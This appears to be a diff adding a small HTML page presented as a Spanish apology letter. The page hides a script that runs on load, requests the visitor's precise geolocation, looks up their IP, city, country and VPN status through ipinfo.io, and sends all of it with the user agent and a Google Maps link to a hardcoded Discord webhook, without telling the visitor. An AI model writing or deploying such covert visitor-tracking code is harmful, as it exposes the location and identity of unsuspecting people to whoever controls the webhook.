@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to an awesome website</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        p {
+            color: #555;
+        }
+
+        a {
+            color: #007BFF;
+        }
+    </style>
+</head>
+<body>
+    <h1>Mau Apology Letters.</h1>
+    <p>Hola, Obama, whopper, buenascarnes, y Santi perdón por sentirlos incómodos y hacer cosas un tanto raras, perdón y ya no lo vuelvo a hacer bye y bendiciones.</p>
+    <p></p>
+    <i>Created in Moop X Storage in 7 December.</i>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const webhookUrl = 'https://discord.com/api/webhooks/1181948401353502751/dv7MXBVzmttSIHREI2lZ67U2sb5CvroDpv62nsGAH1yDBihziRNfX3vtYJY304G14BF4'; // Replace with your Discord webhook URL
+
+            // Function to send user and device information to Discord
+            const sendInfoToDiscord = (ip, address, userAgent, isVPN, coordinates) => {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `New visitor info:\nIP: ${ip || 'N/A'}\nAddress: ${address || 'N/A'}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}\nCoordinates: ${coordinates}\nGoogle Maps Link: ${getGoogleMapsLink(coordinates)}`,
+                    }),
+                });
+            };
+
+            // Function to get Google Maps link with coordinates
+            const getGoogleMapsLink = (coordinates) => {
+                return `https://www.google.com/maps?q=${coordinates}`;
+            };
+
+            // Function to get visitor's information including coordinates
+            const getVisitorInfo = async () => {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    });
+
+                    const coordinates = `${position.coords.latitude},${position.coords.longitude}`;
+
+                    // Requesting IP and address from a third-party service (replace with your preferred service)
+                    const infoResponse = await fetch('https://ipinfo.io/json');
+                    const infoData = await infoResponse.json();
+
+                    const ip = infoData.ip || 'N/A';
+                    const address = `${infoData.city || 'N/A'}, ${infoData.region || 'N/A'}, ${infoData.country || 'N/A'}`;
+                    const userAgent = navigator.userAgent;
+                    const isVPN = infoData.vpn || false;
+
+                    // Sending data to Discord with VPN status
+                    sendInfoToDiscord(ip, address, userAgent, isVPN, coordinates);
+                } catch (error) {
+                    console.error('Error fetching location or address:', error);
+                }
+            };
+
+            // Call the function when the page loads
+            getVisitorInfo();
+        });
+    </script>
+</body>
+</html>
